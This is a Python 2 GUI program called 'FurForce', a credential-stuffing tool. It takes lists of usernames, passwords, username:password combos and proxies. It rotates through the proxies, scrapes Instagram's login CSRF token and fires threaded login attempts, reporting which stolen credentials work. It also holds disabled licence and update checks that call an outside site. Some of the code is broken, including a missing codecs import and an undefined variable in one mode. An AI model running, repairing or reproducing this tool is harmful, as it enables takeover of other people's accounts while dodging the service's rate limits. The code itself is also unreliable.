# -*- coding: utf-8 -*-
__author__ = 'Furry~'
import concurrent.futures
import requests
import requests.exceptions
import sys
import uuid
import Tkinter as Tk
import re
import ttk
from tkFileDialog import askopenfilename
from random import choice


class App():
    def __init__(self, parent):

        # Check To See If You Purchased c:
        # self.ownercheck()

        # Check To See If There's An Update
        # self.updatecheck()

        # Setup Window
        self.window = parent
        self.window.title('FurForce')

        # Set Variables
        self.fileopenoptions = dict(defaultextension='.txt', filetypes=[('Text file', '*.txt'), ('All files', '*.*')])
        self.names = Tk.StringVar(self.window)
        self.passes = Tk.StringVar(self.window)
        self.combos = Tk.StringVar(self.window)
        self.proxies = Tk.StringVar(self.window)
        self.radios = Tk.IntVar(self.window)
        self.boxselections = Tk.StringVar(self.window)
        self.userpass = None

        # Make Widgets
        self.labelnames = Tk.Label(self.window, text="Usernames: ")
        self.labelpasses = Tk.Label(self.window, text="Passwords: ")
        self.labelproxies = Tk.Label(self.window, text="Proxies: ")
        self.labelcombos = Tk.Label(self.window, text="Combo List: ")
        self.entrynames = Tk.Entry(self.window, textvariable=self.names)
        self.entrycombos = Tk.Entry(self.window, textvariable=self.combos)
        self.entrypasses = Tk.Entry(self.window, textvariable=self.passes)
        self.entryproxies = Tk.Entry(self.window, textvariable=self.proxies)
        self.startbutton = Tk.Button(self.window, text="Start!", command=self.start)
        self.namebutton = Tk.Button(self.window, text="Open Name File!", command=self.setnames)
        self.passesbutton = Tk.Button(self.window, text="Open Password File!", command=self.setpasses)
        self.combosbutton = Tk.Button(self.window, text="Open Combo File!", command=self.setcombos)
        self.proxybutton = Tk.Button(self.window, text="Open Proxy File!", command=self.setproxies)
        self.combobox = ttk.Combobox(self.window, textvariable=self.boxselections, state='readonly')
        self.radiouserpass = Tk.Radiobutton(self.window, text="Usernames And Passwords", command=self.selectuserpass,
                                            variable=self.radios, value=1)
        self.radiocombos = Tk.Radiobutton(self.window, text="Combo Lists", command=self.selectcombo,
                                          variable=self.radios, value=2)

        # Set Combo Box Items
        self.combobox['values'] = (
            'Instagram',
            'Amazon'
        )
        self.combobox.current(0)

        # Grid Widgets
        self.radiocombos.grid(row=4, column=0, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.radiouserpass.grid(row=4, column=1, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.labelproxies.grid(row=3, column=0, sticky=Tk.W)
        self.entryproxies.grid(row=3, column=1, columnspan=4, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.proxybutton.grid(row=3, column=5, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.startbutton.grid(row=5, column=0, columnspan=7, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.labelnames.grid(row=0, column=0, sticky=Tk.W)
        self.entrynames.grid(row=0, column=1, columnspan=4, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.namebutton.grid(row=0, column=5, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.labelpasses.grid(row=1, column=0, sticky=Tk.W)
        self.entrypasses.grid(row=1, column=1, columnspan=4, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.passesbutton.grid(row=1, column=5, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.labelcombos.grid(row=2, column=0, sticky=Tk.W)
        self.entrycombos.grid(row=2, column=1, columnspan=4, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.combosbutton.grid(row=2, column=5, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.combobox.grid(row=4, column=5, sticky=Tk.W+Tk.E+Tk.N+Tk.S)

    def ownercheck(self):
        r = requests.get('http://coinsgo.in/hwid.php?hwid={0}'.format(str(uuid.getnode())),
                         proxies={})
        if 'truelikeurmum' in r.text:
            print "You own this c:!"
        else:
            print "You do not own this. Please go away :c!"
            sys.exit("ur poop")

    def updatecheck(self):
        r = requests.get('http://coinsgo.in/version.xml',
                         proxies={})
        if '3.0.0.0' in r.text:
            print "Up to date!"
        else:
            print "Please visit http://coinsgo.in/ to update"

    def selectcombo(self):
        self.userpass = False

    def selectuserpass(self):
        self.userpass = True

    def instagram(self, user, pword):
        global work
        work = True
        headers = {'User-agent': 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                                 'Chrome/32.0.1667.0 Safari/537.36',
                   'Referer': 'https://instagram.com/accounts/login/'}
        try:
            while work:
                global proxy, proxie
                proxy = choice(proxies)
                proxie = {
                    "http": "http://{0}".format(proxy.strip()),
                    "https": "http://{0}".format(proxy.strip())
                }
                r = requests.get('http://www.ipchicken.com/', headers=headers, proxies=proxie, timeout=7.5)
                if r.status_code == 200:
                    work = False
                else:
                    work = True
            user = user.strip()
            pword = pword.strip()
            response = requests.get('https://instagram.com/accounts/login/', headers=headers, proxies=proxie,
                                    timeout=10, verify=False)
            regex = re.compile('<input type="hidden" name="csrfmiddlewaretoken" value="(.*)"/>')
            r = re.search(regex, response.text)
            data = {
                'csrfmiddlewaretoken': r.groups()[0],
                'username': user,
                'password': pword
            }
            print data
            login = requests.post('https://instagram.com/accounts/login/', data=data,
                                  verify=False, proxies=proxie, headers=headers, cookies=response.cookies,
                                  timeout=10)
            if 'https://instagram.com/accounts/logout' in login.text:
                print '{0}:{1} Works For Instagram!'.format(user, pword)
            else:
                print '{0}:{1} Doesn\'t Work For Instagram!'.format(user, pword)

        except requests.exceptions.HTTPError:
            print "HTTP Error!"
            work = True
        except requests.exceptions.ConnectionError:
            print "Connection Error!"
            work = True

    def start(self):
        if self.userpass:
            if self.names.get() == '':
                print 'You didn\'t add any names!'
            else:
                with codecs.open(self.names.get(), 'r') as f:
                    global names
                    names = f.readlines()
                    f.close()
            if self.proxies.get() == '':
                print 'You didn\'t add any proxies!'
            else:
                with open(self.proxies.get(), 'r') as f:
                    global proxies
                    proxies = f.readlines()
                    f.close()
            if self.passes.get() == '':
                print 'You didn\'t add any passwords!'
            else:
                with open(self.passes.get(), 'r') as f:
                    global passes
                    passes = f.readlines()
                    f.close()
            with concurrent.futures.ThreadPoolExecutor(max_workers=25) as x:
                for userpasscombo in userpass:
                    upass = userpasscombo.split(':')
                    x.submit(self.instagram, upass[0], upass[1])
        else:
            if self.entrycombos.get() == '':
                print 'You didn\'t add any combos!'
            else:
                with open(self.entrycombos.get(), 'r') as f:
                    global userpass
                    userpass = f.readlines()
                    f.close()
            if self.proxies.get() == '':
                print 'You didn\'t add any proxies!'
            else:
                with open(self.proxies.get(), 'r') as f:
                    global proxies
                    proxies = f.readlines()
                    f.close()
            with concurrent.futures.ThreadPoolExecutor(max_workers=25) as x:
                for userpasscombo in userpass:
                    upass = userpasscombo.split(':')
                    print upass
                    x.submit(self.instagram, upass[0], upass[1])

    def setnames(self):
        filename = askopenfilename(**self.fileopenoptions)
        self.names.set(filename)

    def setproxies(self):
        filename = askopenfilename(**self.fileopenoptions)
        self.proxies.set(filename)

    def setcombos(self):
        filename = askopenfilename(**self.fileopenoptions)
        self.combos.set(filename)

    def setpasses(self):
        filename = askopenfilename(**self.fileopenoptions)
        self.passes.set(filename)

if __name__ == "__main__":
    root = Tk.Tk()
    app = App(root)
    root.mainloop()